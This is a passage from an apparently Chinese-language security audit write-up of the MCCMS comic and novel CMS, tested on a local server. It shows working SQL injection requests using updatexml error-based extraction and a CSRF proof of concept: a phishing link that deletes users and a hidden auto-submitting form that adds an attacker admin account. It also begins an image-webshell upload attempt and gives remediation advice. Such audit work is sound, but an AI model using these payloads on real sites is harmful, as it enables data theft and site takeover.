+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/helpers/common_helper.php</span></span><br><span class="line"><span class="comment">//SQL过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_replace</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>)) &#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">			<span class="variable">$string</span>[<span class="title function_ invoke__">safe_replace</span>(<span class="variable">$k</span>)] = <span class="title function_ invoke__">safe_replace</span>(<span class="variable">$v</span>); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%20&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">            <span class="comment">/*   %20可以用+代替   */</span></span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%27&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%2527&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&amp;#039;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;&amp;lt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&amp;gt;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\%&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line">			<span class="variable">$string</span> = <span class="title function_ invoke__">str_encode</span>(<span class="variable">$string</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们先简单构造一个</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span> /index.php/book/category/order/addtime/pay/<span class="number">1</span>/finish/<span class="number">1</span>/list/<span class="number">1</span>)+order+by+<span class="number">5</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>发现报错</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">从</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>select * from mc_book where yid=0 and pay=0 and serialize=&#x27;连载&#x27; and cid in(1&amp;#039) order by addtime desc<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">变成</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Unknown column &#x27;5&#x27; in &#x27;order clause&#x27;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">由符号报错，变成命令报错，看来我们的sql命令在这个构造中是可以执行的</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>order by</code>，判断出当前列数只有<code>1</code>列</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221127003105524.png"><img src="/CMS-Test/image-20221127003105524.png" alt="image-20221127003105524"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221127003130496.png"><img src="/CMS-Test/image-20221127003130496.png" alt="image-20221127003130496"></a></p>
+<p>此处的注入点代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$k</span> == <span class="string">&#x27;list&#x27;</span>)&#123; <span class="comment">//分类</span></span><br><span class="line">                   <span class="variable">$title</span>[] = <span class="variable">$data</span>[<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;book_class&#x27;</span>,<span class="string">&#x27;name&#x27;</span>,<span class="variable">$v</span>);</span><br><span class="line">                   <span class="keyword">if</span>((<span class="keyword">int</span>)<span class="variable">$v</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                       <span class="variable">$cids</span> = <span class="title function_ invoke__">getcid</span>(<span class="variable">$v</span>);</span><br><span class="line">                       <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$cids</span>))&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid in(&quot;</span>.<span class="variable">$cids</span>.<span class="string">&quot;)&quot;</span>;</span><br><span class="line">                       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                           <span class="variable">$sql</span> .= <span class="string">&quot; and cid=&quot;</span>.<span class="variable">$cids</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>$cid</code>就是引起<code>sql</code>注入的参数点</p>
+<p>跟进<code>getcid</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//解析多个分类ID  如 cid=1,2,3,4,5,6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getcid</span>(<span class="params"><span class="variable">$CID</span>,<span class="variable">$type</span>=<span class="string">&#x27;class&#x27;</span>,<span class="variable">$zd</span>=<span class="string">&#x27;fid&#x27;</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ci</span> = &amp;<span class="title function_ invoke__">get_instance</span>();</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$CID</span>))&#123;</span><br><span class="line">		<span class="variable">$ClassArr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$CID</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$ClassArr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select id from &quot;</span>.Mc_SqlPrefix.<span class="variable">$type</span>.<span class="string">&quot; where &quot;</span>.<span class="variable">$zd</span>.<span class="string">&quot;=&#x27;<span class="subst">$ClassArr</span>[<span class="subst">$i</span>]&#x27;&quot;</span>;<span class="comment">//sql语句的组织返回</span></span><br><span class="line">			<span class="variable">$result</span>=<span class="variable">$ci</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)-&gt;<span class="title function_ invoke__">result</span>();</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">				<span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">					<span class="variable">$ClassArr</span>[]=<span class="variable">$row</span>-&gt;id;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$CID</span>=<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ClassArr</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$CID</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试后发现无法进行联合注入</p>
+<p>只能试试报错注入或者盲注</p>
+<p>盲注试了试发现是无法得到反应的</p>
+<p>于是我试了试报错注入</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">GET</span> /<span class="selector-tag">index</span><span class="selector-class">.php</span>/<span class="selector-tag">book</span>/<span class="selector-tag">category</span>/<span class="selector-tag">order</span>/<span class="selector-tag">addtime</span>/<span class="selector-tag">pay</span>/<span class="number">1</span>/<span class="selector-tag">finish</span>/<span class="number">1</span>/<span class="selector-tag">list</span>/<span class="number">1</span>)+<span class="selector-tag">and</span>+<span class="selector-tag">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">database</span>(),<span class="number">0</span>x7e,<span class="built_in">user</span>(),<span class="number">0</span>x7e,<span class="variable">@@datadir</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221127141028144.png"><img src="/CMS-Test/image-20221127141028144.png" alt="image-20221127141028144"></a></p>
+<p>果然是报错注入，我们得到了我们想要的数据，虽然因为报错函数限制了显示数据字符个数，用<code>substring</code>即可</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">GET</span> /<span class="selector-tag">index</span><span class="selector-class">.php</span>/<span class="selector-tag">book</span>/<span class="selector-tag">category</span>/<span class="selector-tag">order</span>/<span class="selector-tag">addtime</span>/<span class="selector-tag">pay</span>/<span class="number">1</span>/<span class="selector-tag">finish</span>/<span class="number">1</span>/<span class="selector-tag">list</span>/<span class="number">1</span>)+<span class="selector-tag">and</span>+<span class="selector-tag">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0</span>x7e,<span class="built_in">substring</span>(<span class="variable">@@datadir</span>,<span class="number">15</span>),<span class="number">0</span>x7e),<span class="number">1</span>)%<span class="number">23</span> </span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221127141800552.png"><img src="/CMS-Test/image-20221127141800552.png" alt="image-20221127141800552"></a></p>
+<p>最后得到</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">数据库名:mccms</span></span><br><span class="line"><span class="section">数据库管理员名字:root</span></span><br><span class="line"><span class="section">数据库路径: D:\phpstudy_pro\Extensions\MySQL8.0.12\data\</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><blockquote>
+<p>1.对代入sql查询语句的参数进行严格过滤<br>2.减少用户对传入sql查询的中参数的直接控制的机会<br>3.对一些数据函数禁止用，或者少用<br>4.最好不要直接把用户数据带入数据库中进行查询</p>
+</blockquote>
+<h3 id="3-后台一处安全漏洞"><a href="#3-后台一处安全漏洞" class="headerlink" title="3.后台一处安全漏洞"></a>3.后台一处安全漏洞</h3><blockquote>
+<p>后台漏洞<br>一般猜测为登录存在sql注入，模板注入，越权，命令执行,csrf等等</p>
+</blockquote>
+<h4 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h4><p>由于之前修复过<code>sql</code>注入，所以在这里的可能性就很少了，于是对其他漏洞进行测试</p>
+<p>不过，抓包过程中发现其信息皆是以明文形式发送</p>
+<p>所以猜测存在<code>csrf</code></p>
+<p>【先进行了漏洞测试】</p>
+<p>以此处为例</p>
+<p>对<code>csrf</code>实现控制管理员删除用户代码分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sys/apps/controllers/admin/User.php</span></span><br><span class="line"><span class="comment">//删除会员</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">del</span>(<span class="params"><span class="variable">$id</span>=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line"> 	    <span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable">$id</span>;</span><br><span class="line"> 	    <span class="keyword">if</span>(<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"> 	    	<span class="variable">$ids</span> = <span class="variable language_">$this</span>-&gt;input-&gt;<span class="title function_ invoke__">get_post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">/*get_post先查看GET数据中的id，再查看POST数据中的id</span></span><br><span class="line"><span class="comment">            这里也是我们实现csrf的关键处，</span></span><br><span class="line"><span class="comment">            这里的id以明文显示，以明文读取，那么只要修改明文，任意的id都可以实现进行后续删除操作</span></span><br><span class="line"><span class="comment">            如果前端对明文数据加密，再在这里比较匹对后，再传参可能更安全*/</span></span><br><span class="line">            </span><br><span class="line"> 	    	<span class="variable">$ids</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$ids</span>);</span><br><span class="line">            <span class="comment">/*implode —用字符串连接数组元素*/</span></span><br><span class="line"> 	    	<span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ids</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]+[,]?)+$/&#x27;</span>, <span class="variable">$ids</span>))&#123;</span><br><span class="line">				<span class="variable">$id</span> = <span class="variable">$ids</span>;</span><br><span class="line">			&#125;</span><br><span class="line"> 	    &#125;</span><br><span class="line"> 	    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$id</span>)) <span class="title function_ invoke__">get_json</span>(<span class="string">&#x27;ID不能为空~!&#x27;</span>);</span><br><span class="line"> 	    <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line"> 	    <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$_id</span>) &#123;</span><br><span class="line"> 	    	<span class="comment">//删除头像地址</span></span><br><span class="line">			<span class="variable">$pic</span> = <span class="title function_ invoke__">getzd</span>(<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;pic&#x27;</span>,<span class="variable">$id</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;load-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;tongbu&#x27;</span>);</span><br><span class="line">			<span class="variable language_">$this</span>-&gt;tongbu-&gt;<span class="title function_ invoke__">del</span>(<span class="variable">$pic</span>);</span><br><span class="line">			<span class="comment">//删除记录</span></span><br><span class="line">    		<span class="variable language_">$this</span>-&gt;mcdb-&gt;<span class="title function_ invoke__">get_del</span>(<span class="string">&#x27;user&#x27;</span>,<span class="variable">$_id</span>);</span><br><span class="line"> 	    &#125;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&#x27;恭喜您，删除成功~!&#x27;</span>;</span><br><span class="line">		<span class="variable">$arr</span>[<span class="string">&#x27;url&#x27;</span>] = <span class="title function_ invoke__">links</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">get_json</span>(<span class="variable">$arr</span>,<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><code>CSRF</code>此处以管理员可以删除用户为例</p>
+<p>这是在删除用户时进行的抓包数据，发现其信息皆以明文显示，只要修改<code>id</code>数据就可以达到删除指定用户的目的</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126222051780.png"><img src="/CMS-Test/image-20221126222051780.png" alt="image-20221126222051780"></a></p>
+<p>先创建<code>2</code>个用户，<code>id</code>为<code>3，4</code></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126222725930.png"><img src="/CMS-Test/image-20221126222725930.png" alt="image-20221126222725930"></a></p>
+<p>然后根据我们的抓包数据构造一个钓鱼的链接</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">&quot;http://127.0.0.3/admin.php/user/del?id%5B%5D=3&quot;</span>&gt;click me&lt;/<span class="keyword">a</span>&gt;  </span><br><span class="line"><span class="comment">#这里的id以GET方式提交也可以</span></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126224127893.png"><img src="/CMS-Test/image-20221126224127893.png" alt="image-20221126224127893"></a></p>
+<p>保持登录的状态点击</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126224210939.png"><img src="/CMS-Test/image-20221126224210939.png" alt="image-20221126224210939"></a></p>
+<p>也试了试<code>4</code></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126224303900.png"><img src="/CMS-Test/image-20221126224303900.png" alt="image-20221126224303900"></a></p>
+<p>发现也显示成功</p>
+<p>这是我们返回后台查看用户信息</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221126224401491.png"><img src="/CMS-Test/image-20221126224401491.png" alt="image-20221126224401491"></a></p>
+<p>发现只有<code>ID=1</code>的用户了</p>
+<p>我们的<code>csrf</code>也就攻击成功了</p>
+<p>甚至添加后台管理员账户也是可以</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221128180130164.png"><img src="/CMS-Test/image-20221128180130164.png" alt="image-20221128180130164"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221128180148359.png"><img src="/CMS-Test/image-20221128180148359.png" alt="image-20221128180148359"></a></p>
+<p>构造钓鱼链接</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>MCCMS POST<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;btn2()&quot;</span>&gt;</span>MCCMS CSRF<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.3/admin.php/sys/save&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nichen&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ttoc&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123456&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">btn2</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> f = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;test&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            f.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>post</code>方式以火狐浏览器提交</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221128201313981.png"><img src="/CMS-Test/image-20221128201313981.png" alt="image-20221128201313981"></a></p>
+<p>提交成功，成功向后台添加了我们的恶意用户</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221128201331468.png"><img src="/CMS-Test/image-20221128201331468.png" alt="image-20221128201331468"></a></p>
+<blockquote>
+<p>除此以外</p>
+<p>其他管理员可以控制的操作，比如修改用户金币数，月票数等等，因为都是以明文提交，都可以用csrf实现</p>
+</blockquote>
+<hr>
+<h4 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h4><blockquote>
+<p>此处我们发现用户凭据发现以明文形式发送<br>那么中间就可能被第三方获取并利用，所以建议</p>
+<p>1.对数据进行进一步的加密<br>2.可以在HTTP请求中加入一个随机产生的token，并在后台服务器端验证token，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求<br>3.验证请求的referer值<br>4.对参数传入方式和验证的过程严格控制，以免传入外来恶意数据，导致信息泄露或丢失<br>5.用户二次验证，对于这种不可逆操作执行前进行比如手机验证码之类的第二次验证，不以cookie为唯一验证</p>
+</blockquote>
+<h3 id="4-作家发布漫画小说命令执行漏洞-复现失败"><a href="#4-作家发布漫画小说命令执行漏洞-复现失败" class="headerlink" title="4.作家发布漫画小说命令执行漏洞(复现失败)"></a>4.作家发布漫画小说命令执行漏洞(复现失败)</h3><h4 id="代码分析-漏洞利用-1"><a href="#代码分析-漏洞利用-1" class="headerlink" title="代码分析+漏洞利用"></a>代码分析+漏洞利用</h4><blockquote>
+<p>猜测<br>1.发布木马文件，导致命令执行<br>2.一些客户端可以修改的参数，被命令执行函数包含且执行</p>
+</blockquote>
+<p>但根据的<code>2.5.8</code>更新文档</p>
+<blockquote>
+<p>Mccms漫画小说系统-v2.5.8更新详情<br>1.修复了SQL注入高危漏洞<br>2.修复了木马伪装图片上传漏洞</p>
+</blockquote>
+<p>所以如果通过漫画图片上传木马，大概率是行不通了</p>
+<p>先注册完信息，再后台完成作者认证</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122151951892.png"><img src="/CMS-Test/image-20221122151951892.png" alt="image-20221122151951892"></a></p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122152043515.png"><img src="/CMS-Test/image-20221122152043515.png" alt="image-20221122152043515"></a></p>
+<h5 id="漫画"><a href="#漫画" class="headerlink" title="漫画"></a>漫画</h5><p>但是也可以试试上传图片马，看看它怎么修复的</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里限制了文件类型，可以试试能不能绕过</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122152444788.png"><img src="/CMS-Test/image-20221122152444788.png" alt="image-20221122152444788"></a></p>
+<p>直接上传脚本文件会被拦截</p>
+<p><a data-fancybox="gallery" data-src="/CMS-Test/image-20221122153207506.png"><img src="/CMS-Test/image-20221122153207506.png" alt="image-20221122153207506"></a></p>
+<p>上传图片🐎的话 ，会显示非法图片</p>
